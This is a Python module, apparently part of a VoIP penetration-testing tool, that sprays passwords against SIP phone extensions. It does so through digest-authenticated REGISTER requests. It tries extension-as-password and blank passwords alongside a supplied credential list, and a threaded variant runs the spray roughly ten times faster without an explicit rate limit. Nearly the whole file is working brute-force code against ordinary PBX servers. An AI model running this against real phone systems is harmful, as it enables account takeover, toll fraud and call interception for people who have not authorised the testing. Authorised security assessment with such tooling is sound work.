"""Credential spraying against discovered extensions.

Uses REGISTER with SIP digest auth. Rate-limited; stops at first match per
extension to avoid account lockouts.
"""
from __future__ import annotations

from dataclasses import dataclass

from . import sip
from .events import bus
from .utils import RateLimiter, local_ip_for, rand_call_id, rand_tag


@dataclass
class CredResult:
    extension: str
    username: str
    password: str
    success: bool
    evidence: str


def load_credentials(path: str) -> list[tuple[str, str]]:
    creds: list[tuple[str, str]] = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                u, p = line.split(":", 1)
                creds.append((u, p))
    return creds


def try_register(
    host: str,
    ext: str,
    username: str,
    password: str,
    port: int = 5060,
    local_ip: str | None = None,
    timeout: float = 3.0,
    traffic_log=None,
) -> tuple[bool, str]:
    """Return (success, evidence). Success = server accepted digest (200 OK)."""
    if not local_ip:
        local_ip = local_ip_for(host)
    uri = f"sip:{host}"
    call_id = rand_call_id()
    tag = rand_tag()

    # 1st leg: unauth REGISTER to get nonce
    msg1 = sip.build_message(
        "REGISTER", uri,
        from_user=ext, to_user=ext,
        host=host, port=port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
        extra_headers=["Expires: 30"],
    )
    data1 = sip.send_and_recv(msg1, host, port, 0, timeout, traffic_log=traffic_log)
    if not data1:
        return False, "no response to REGISTER"
    resp1 = sip.parse_response(data1)
    if not resp1:
        return False, "unparseable REGISTER response"
    if resp1.status_code == 200:
        # Extension already open — record but not credentialed
        return True, "200 OK on first REGISTER (open registration, no auth)"
    if not resp1.is_auth_required:
        return False, f"unexpected {resp1.status_code} {resp1.reason}"

    params = resp1.auth_params
    if not params:
        return False, "no digest params in challenge"

    # 2nd leg: authenticated REGISTER
    auth_header_name = (
        "Proxy-Authorization" if resp1.status_code == 407 else "Authorization"
    )
    try:
        auth_header = sip.build_auth_header(
            username, password, "REGISTER", uri, params,
            header_name=auth_header_name,
        )
    except ValueError as exc:
        return False, f"auth skipped: {exc}"
    msg2 = sip.build_message(
        "REGISTER", uri,
        from_user=ext, to_user=ext,
        host=host, port=port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=2, from_tag=tag,
        auth_header=auth_header,
        extra_headers=["Expires: 30"],
    )
    data2 = sip.send_and_recv(msg2, host, port, 0, timeout, traffic_log=traffic_log)
    if not data2:
        return False, "no response to authed REGISTER"
    resp2 = sip.parse_response(data2)
    if not resp2:
        return False, "unparseable authed REGISTER response"
    if resp2.status_code == 200:
        return True, f"200 OK (realm={params.get('realm','')})"
    return False, f"{resp2.status_code} {resp2.reason}"


def spray(
    host: str,
    extensions: list[str],
    cred_pairs: list[tuple[str, str]],
    port: int = 5060,
    timeout: float = 3.0,
    rate_per_second: float = 5.0,
    traffic_log=None,
    stop_on_first: bool = True,
    smart_self_password: bool = True,
) -> list[CredResult]:
    """Spray credentials. For each extension, tries creds until success or list
    exhausted. Also tries username=ext with password=ext (very common)."""
    rate = RateLimiter(rate_per_second)
    local_ip = local_ip_for(host)
    results: list[CredResult] = []
    for ext in extensions:
        pairs: list[tuple[str, str]] = []
        if smart_self_password:
            pairs.append((ext, ext))
            pairs.append((ext, ""))
        # Try creds as-is (admin/admin, etc) AND with the extension as username
        for u, p in cred_pairs:
            pairs.append((u, p))
            if u != ext:
                pairs.append((ext, p))
        seen = set()
        for u, p in pairs:
            if (u, p) in seen:
                continue
            seen.add((u, p))
            rate.wait()
            ok, ev = try_register(
                host, ext, u, p, port=port, local_ip=local_ip,
                timeout=timeout, traffic_log=traffic_log,
            )
            results.append(CredResult(ext, u, p, ok, ev))
            if ok:
                bus.emit("spray.hit", {
                    "host": host, "extension": ext,
                    "username": u, "password": p,
                })
                if stop_on_first:
                    break
    return results


def spray_parallel(
    host: str,
    extensions: list[str],
    cred_pairs: list[tuple[str, str]],
    port: int = 5060,
    timeout: float = 3.0,
    max_workers: int = 10,
    traffic_log=None,
    stop_on_first: bool = True,
    smart_self_password: bool = True,
) -> list[CredResult]:
    """Parallel credential spray — significantly faster than serial spray().

    Tests multiple (extension, credential) pairs concurrently.
    max_workers=10 gives ~10× speedup vs serial for large extension lists.

    Rate limiting is implicit: each worker blocks on its own socket timeout,
    so the actual rate is bounded by max_workers / timeout.
    """
    import threading
    from concurrent.futures import ThreadPoolExecutor, as_completed

    local_ip = local_ip_for(host)
    results: list[CredResult] = []
    results_lock = threading.Lock()
    stop_events: dict[str, threading.Event] = {ext: threading.Event()
                                                for ext in extensions}

    def _pairs_for_ext(ext: str) -> list[tuple[str, str]]:
        pairs: list[tuple[str, str]] = []
        if smart_self_password:
            pairs.append((ext, ext))
            pairs.append((ext, ""))
        for u, p in cred_pairs:
            pairs.append((u, p))
            if u != ext:
                pairs.append((ext, p))
        # Deduplicate preserving order
        seen: set[tuple[str, str]] = set()
        deduped: list[tuple[str, str]] = []
        for pair in pairs:
            if pair not in seen:
                seen.add(pair)
                deduped.append(pair)
        return deduped

    def _test_one(ext: str, u: str, p: str) -> CredResult | None:
        if stop_events[ext].is_set():
            return None
        ok, ev = try_register(
            host, ext, u, p, port=port, local_ip=local_ip,
            timeout=timeout, traffic_log=traffic_log,
        )
        return CredResult(ext, u, p, ok, ev)

    # Build work list: (ext, username, password) tuples
    work: list[tuple[str, str, str]] = []
    for ext in extensions:
        for u, p in _pairs_for_ext(ext):
            work.append((ext, u, p))

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        future_map = {
            ex.submit(_test_one, ext, u, p): (ext, u, p)
            for ext, u, p in work
        }
        for fut in as_completed(future_map):
            ext, u, p = future_map[fut]
            try:
                cred_result = fut.result()
            except Exception:
                continue
            if cred_result is None:
                continue
            with results_lock:
                results.append(cred_result)
            if cred_result.success:
                bus.emit("spray.hit", {
                    "host": host, "extension": ext,
                    "username": u, "password": p,
                })
                if stop_on_first:
                    stop_events[ext].set()

    # Sort by extension then by success (hits first)
    results.sort(key=lambda r: (r.extension, not r.success))
    return results
